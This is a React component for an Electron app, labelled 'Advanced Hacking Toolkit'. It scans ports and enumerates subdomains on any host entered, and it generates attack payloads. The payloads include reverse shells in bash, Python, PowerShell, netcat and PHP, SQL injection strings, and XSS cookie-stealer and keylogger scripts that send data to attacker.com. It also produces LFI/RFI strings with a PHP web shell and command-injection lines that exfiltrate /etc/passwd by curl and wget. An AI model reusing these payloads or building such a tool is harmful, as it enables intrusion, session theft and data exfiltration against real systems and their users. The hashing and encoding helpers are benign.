import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './ToolsPanel.module.css';

const HackingTools: React.FC = () => {
  const [expandedCategories, setExpandedCategories] = useState<string[]>(['recon']);
  const [output, setOutput] = useState('');
  const [loading, setLoading] = useState(false);
  const { tabs, activeTabId, updateTabContent } = useStore();

  const getEditorContent = () => {
    const tab = activeTabId ? tabs.find(t => t.id === activeTabId) : null;
    return tab?.content || output || '';
  };

  const insertToEditor = (text: string) => {
    if (activeTabId) {
      const tab = tabs.find(t => t.id === activeTabId);
      if (tab) {
        updateTabContent(tab.id, text);
      }
    } else {
      setOutput(text);
    }
  };

  const runTool = async (toolName: string, action: () => Promise<string>) => {
    setLoading(true);
    const input = getEditorContent();
    setOutput(`[${toolName}]\nRunning on: ${input.substring(0, 50)}${input.length > 50 ? '...' : ''}\n\n`);
    try {
      const result = await action();
      insertToEditor(`[${toolName}]\n\n${result}`);
      setOutput(`[${toolName}]\n\n${result}`);
    } catch (error) {
      const msg = `[${toolName}]\nError: ${error}`;
      setOutput(msg);
      insertToEditor(msg);
    }
    setLoading(false);
  };

  const categories = [
    {
      name: 'Reconnaissance',
      icon: '🔍',
      tools: [
        {
          id: 'subdomain-enum',
          name: 'Subdomain Enumerator',
          description: 'Find common subdomains for a target',
          action: () => runTool('Subdomain Enum', async () => {
            const domain = getEditorContent().trim() || 'example.com';
            const subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging', 'test', 'vpn', 'remote', 'blog', 'shop', 'store', 'portal', 'dashboard', 'cpanel', 'webmail'];
            let result = `Enumerating subdomains for: ${domain}\n\n`;
            
            for (const sub of subdomains) {
              const target = `${sub}.${domain}`;
              try {
                const lookup = await window.electronAPI.net.dnsLookup(target);
                if (lookup.addresses && lookup.addresses.length > 0) {
                  result += `✓ ${target} → ${lookup.addresses[0]}\n`;
                }
              } catch {
                result += `✗ ${target}\n`;
              }
            }
            return result;
          }),
        },
        {
          id: 'reverse-dns',
          name: 'Reverse DNS Lookup',
          description: 'Find hostname from IP address',
          action: () => runTool('Reverse DNS', async () => {
            const ip = getEditorContent().trim() || '8.8.8.8';
            const result = await window.electronAPI.net.reverseDns(ip);
            return `IP: ${ip}\nHostname: ${result.hostnames && result.hostnames.length > 0 ? result.hostnames[0] : 'Not found'}\n`;
          }),
        },
        {
          id: 'port-sweep',
          name: 'Port Sweeper',
          description: 'Advanced port scan with service detection',
          action: () => runTool('Port Sweep', async () => {
            const host = getEditorContent().trim() || '127.0.0.1';
            const portRanges = [
              { ports: [20, 21, 22, 23, 25], label: 'FTP/SSH/Telnet/SMTP' },
              { ports: [53, 80, 443, 8080, 8443], label: 'DNS/HTTP/HTTPS' },
              { ports: [110, 143, 993, 995], label: 'Mail (POP3/IMAP)' },
              { ports: [445, 3389, 5900], label: 'SMB/RDP/VNC' },
              { ports: [1433, 3306, 5432, 27017], label: 'Databases' },
            ];
            
            let result = `Port Sweep: ${host}\n\n`;
            for (const range of portRanges) {
              result += `\n[${range.label}]\n`;
              for (const port of range.ports) {
                const res = await window.electronAPI.net.scanPort(host, port, 300);
                if (res.isOpen) {
                  result += `✓ Port ${port} OPEN\n`;
                }
              }
            }
            return result;
          }),
        },
      ],
    },
    {
      name: 'Payload Generation',
      icon: '💉',
      tools: [
        {
          id: 'reverse-shell',
          name: 'Reverse Shell Generator',
          description: 'Generate reverse shell payloads',
          action: () => runTool('Reverse Shell Gen', async () => {
            const [ip, port] = (getEditorContent().trim() || '10.0.0.1:4444').split(':');
            const p = port || '4444';
            
            return `Reverse Shell Payloads for ${ip}:${p}\n\n` +
              `[Bash]\n` +
              `bash -i >& /dev/tcp/${ip}/${p} 0>&1\n\n` +
              `[Python]\n` +
              `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\n\n` +
              `[PowerShell]\n` +
              `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"\n\n` +
              `[Netcat]\n` +
              `nc -e /bin/sh ${ip} ${p}\n\n` +
              `[PHP]\n` +
              `php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
          }),
        },
        {
          id: 'sql-injection',
          name: 'SQLi Payload Generator',
          description: 'Generate SQL injection payloads',
          action: () => runTool('SQLi Payloads', async () => {
            return `SQL Injection Payloads\n\n` +
              `[Auth Bypass]\n` +
              `' OR '1'='1\n` +
              `' OR '1'='1' --\n` +
              `' OR '1'='1' #\n` +
              `admin' --\n` +
              `admin' #\n\n` +
              `[Union Based]\n` +
              `' UNION SELECT NULL--\n` +
              `' UNION SELECT NULL,NULL--\n` +
              `' UNION SELECT NULL,NULL,NULL--\n` +
              `' UNION SELECT username,password FROM users--\n\n` +
              `[Time-Based Blind]\n` +
              `' AND SLEEP(5)--\n` +
              `'; WAITFOR DELAY '0:0:5'--\n` +
              `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--\n\n` +
              `[Boolean-Based Blind]\n` +
              `' AND 1=1--\n` +
              `' AND 1=2--\n` +
              `' AND 'a'='a\n` +
              `' AND 'a'='b\n\n` +
              `[Database Enumeration]\n` +
              `' UNION SELECT schema_name FROM information_schema.schemata--\n` +
              `' UNION SELECT table_name FROM information_schema.tables--\n` +
              `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`;
          }),
        },
        {
          id: 'xss-payloads',
          name: 'XSS Payload Generator',
          description: 'Generate Cross-Site Scripting payloads',
          action: () => runTool('XSS Payloads', async () => {
            return `XSS Payloads\n\n` +
              `[Basic]\n` +
              `<script>alert('XSS')</script>\n` +
              `<img src=x onerror=alert('XSS')>\n` +
              `<svg/onload=alert('XSS')>\n` +
              `<body onload=alert('XSS')>\n\n` +
              `[Bypass Filters]\n` +
              `<ScRiPt>alert('XSS')</sCrIpT>\n` +
              `<img src=x onerror="alert('XSS')">\n` +
              `<img src=x onerror="&#97;lert('XSS')">\n` +
              `<img src=x onerror="\\u0061lert('XSS')">\n\n` +
              `[Cookie Stealer]\n` +
              `<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>\n` +
              `<script>new Image().src="http://attacker.com/steal.php?c="+document.cookie</script>\n\n` +
              `[Keylogger]\n` +
              `<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>\n\n` +
              `[DOM-Based]\n` +
              `<script>eval(location.hash.substr(1))</script>\n` +
              `<iframe src="javascript:alert('XSS')"></iframe>`;
          }),
        },
      ],
    },
    {
      name: 'Cryptography & Hashing',
      icon: '🔐',
      tools: [
        {
          id: 'hash-all',
          name: 'Multi-Hash Generator',
          description: 'Generate MD5, SHA-1, SHA-256 hashes',
          action: () => runTool('Multi-Hash', async () => {
            const text = getEditorContent().trim() || 'password123';
            const md5 = await window.electronAPI.crypto.hash('md5', text);
            const sha1 = await window.electronAPI.crypto.hash('sha1', text);
            const sha256 = await window.electronAPI.crypto.hash('sha256', text);
            
            return `Input: ${text}\n\n` +
              `MD5:    ${md5}\n` +
              `SHA-1:  ${sha1}\n` +
              `SHA-256: ${sha256}`;
          }),
        },
        {
          id: 'jwt-decode',
          name: 'JWT Decoder',
          description: 'Decode JSON Web Tokens',
          action: () => runTool('JWT Decoder', async () => {
            const jwt = getEditorContent().trim() || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
            
            try {
              const parts = jwt.split('.');
              if (parts.length !== 3) throw new Error('Invalid JWT format');
              
              const header = JSON.parse(atob(parts[0]));
              const payload = JSON.parse(atob(parts[1]));
              
              return `JWT Decoded\n\n` +
                `[Header]\n${JSON.stringify(header, null, 2)}\n\n` +
                `[Payload]\n${JSON.stringify(payload, null, 2)}\n\n` +
                `[Signature]\n${parts[2]}`;
            } catch {
              return 'Invalid JWT token';
            }
          }),
        },
        {
          id: 'base64-all',
          name: 'Multi-Encoding Tool',
          description: 'Base64, URL, HTML encode/decode',
          action: () => runTool('Multi-Encoding', async () => {
            const text = getEditorContent().trim() || '<script>alert("test")</script>';
            
            return `Original:\n${text}\n\n` +
              `Base64 Encode:\n${btoa(text)}\n\n` +
              `URL Encode:\n${encodeURIComponent(text)}\n\n` +
              `HTML Encode:\n${text.replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]||m))}\n\n` +
              `Hex Encode:\n${Array.from(text).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ')}`;
          }),
        },
      ],
    },
    {
      name: 'Web Exploitation',
      icon: '🌐',
      tools: [
        {
          id: 'lfi-payloads',
          name: 'LFI/RFI Payloads',
          description: 'Local/Remote File Inclusion payloads',
          action: () => runTool('LFI/RFI', async () => {
            return `File Inclusion Payloads\n\n` +
              `[Basic LFI]\n` +
              `../../../etc/passwd\n` +
              `....//....//....//etc/passwd\n` +
              `..%2F..%2F..%2Fetc%2Fpasswd\n\n` +
              `[Windows LFI]\n` +
              `..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n` +
              `..\\..\\..\\boot.ini\n\n` +
              `[PHP Wrappers]\n` +
              `php://filter/convert.base64-encode/resource=index.php\n` +
              `php://input (POST: <?php system($_GET['cmd']); ?>)\n` +
              `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+\n\n` +
              `[RFI]\n` +
              `http://attacker.com/shell.txt\n` +
              `\\\\attacker.com\\share\\shell.php`;
          }),
        },
        {
          id: 'command-injection',
          name: 'Command Injection',
          description: 'OS command injection payloads',
          action: () => runTool('Command Injection', async () => {
            return `Command Injection Payloads\n\n` +
              `[Basic]\n` +
              `; whoami\n` +
              `| whoami\n` +
              `|| whoami\n` +
              `& whoami\n` +
              `&& whoami\n` +
              `\`whoami\`\n` +
              `$(whoami)\n\n` +
              `[Bypass Filters]\n` +
              `;w'h'o'a'm'i\n` +
              `;who$()ami\n` +
              `;who\\ami\n` +
              `;wh''oami\n\n` +
              `[Blind Detection]\n` +
              `; sleep 5\n` +
              `| timeout 5\n` +
              `; ping -c 5 127.0.0.1\n\n` +
              `[Data Exfiltration]\n` +
              `; curl http://attacker.com/exfil?data=$(cat /etc/passwd|base64)\n` +
              `; wget --post-file=/etc/passwd http://attacker.com/exfil`;
          }),
        },
      ],
    },
  ];

  const toggleCategory = (categoryName: string) => {
    setExpandedCategories(prev =>
      prev.includes(categoryName)
        ? prev.filter(c => c !== categoryName)
        : [...prev, categoryName]
    );
  };

  return (
    <div className={styles.toolsPanel}>
      <div className={styles.header}>
        <h2>🎯 Advanced Hacking Toolkit</h2>
      </div>

      <div className={styles.content}>
        <div className={styles.categories}>
          {categories.map((category) => (
            <div key={category.name} className={styles.category}>
              <div
                className={styles.categoryHeader}
                onClick={() => toggleCategory(category.name)}
              >
                <span className={styles.categoryIcon}>{category.icon}</span>
                <span className={styles.categoryName}>{category.name}</span>
                <span className={styles.categoryToggle}>
                  {expandedCategories.includes(category.name) ? '▼' : '▶'}
                </span>
              </div>

              {expandedCategories.includes(category.name) && (
                <div className={styles.tools}>
                  {category.tools.map((tool) => (
                    <button
                      key={tool.id}
                      className={styles.tool}
                      onClick={tool.action}
                      disabled={loading}
                    >
                      <div className={styles.toolName}>{tool.name}</div>
                      <div className={styles.toolDesc}>{tool.description}</div>
                    </button>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>

        <div className={styles.output}>
          <div className={styles.outputHeader}>
            <span>Output</span>
            <button
              className={styles.clearBtn}
              onClick={() => setOutput('')}
            >
              Clear
            </button>
          </div>
          <pre className={styles.outputContent}>{output || 'Tool output will appear here...'}</pre>
        </div>
      </div>
    </div>
  );
};

export default HackingTools;




